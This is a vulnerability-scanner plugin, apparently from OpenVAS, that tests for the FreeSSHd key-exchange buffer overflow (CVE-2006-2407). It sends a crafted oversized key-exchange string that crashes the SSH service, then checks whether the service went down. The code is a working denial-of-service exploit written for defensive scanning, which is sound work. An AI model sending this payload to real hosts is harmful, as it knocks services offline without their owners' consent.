# OpenVAS Vulnerability Test
# $Id: freesshd_key_exchange_overflow.nasl 8023 2017-12-07 08:36:26Z teissa $
# Description: FreeSSHD Key Exchange Buffer Overflow
#
# Authors:
# Ferdy Riphagen <f[dot]riphagen[at]nsec[dot]nl>
#
# Copyright:
# Copyright (C) 2006 Ferdy Riphagen
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_solution = "Upgrade to the latest release. 
See second url in the 'See also' section.

Note :

At this point the FreeSSHD Service is reported down.
You should start it manualy again.";

tag_summary = "A vulnerable version of FreeSSHd is installed on 
the remote host.

Description :

The version installed does not validate key exchange strings
send by a SSH client. This results in a buffer overflow
and possible a compromise of the host if the client is 
sending a long key exchange string.";


if (description) {
 script_id(200012);
 script_version("$Revision: 8023 $");
 script_tag(name:"last_modification", value:"$Date: 2017-12-07 09:36:26 +0100 (Thu, 07 Dec 2017) $");
 script_tag(name:"creation_date", value:"2008-08-22 16:09:14 +0200 (Fri, 22 Aug 2008)");
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

 script_cve_id("CVE-2006-2407");
 script_bugtraq_id(17958);

 name = "FreeSSHD Key Exchange Buffer Overflow";
 script_name(name);


 script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_vul");
 script_family("Gain a shell remotely");
 script_copyright("This script is Copyright (C) 2006 Ferdy Riphagen");

 script_dependencies("find_service.nasl");
 script_require_ports("Services/ssh", 22);
 script_tag(name : "summary" , value : tag_summary);
 script_tag(name : "solution" , value : tag_solution);
 script_xref(name : "URL" , value : "http://secunia.com/advisories/19846");
 script_xref(name : "URL" , value : "http://www.freesshd.com/?ctt=download");
 exit(0);
}

include("misc_func.inc");

port = get_kb_item("Services/ssh");
if (!port) port = 22;

soc = open_sock_tcp(port);
if (!soc) exit(0);

banner = recv(socket:soc, length:128);
if (egrep(pattern:"SSH.+WeOnlyDo", string:banner)) {
 
 ident = "SSH-2.0-OpenSSH_4.2p1";
 exp = ident + raw_string(
		0x0a, 0x00, 0x00, 0x4f, 0x04, 0x05, 
		0x14, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
		0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0xde)
		+ crap(length:20400);

 send(socket:soc, data:exp);
 recv(socket:soc, length:1024);
 close(soc);

 soc = open_sock_tcp(port);
 if (soc) {
  recv = recv(socket:soc, length:128);
  close (soc);
 } 
 if (!soc || (!strlen(recv))) {
  security_message(port);
 }
}
exit(0);
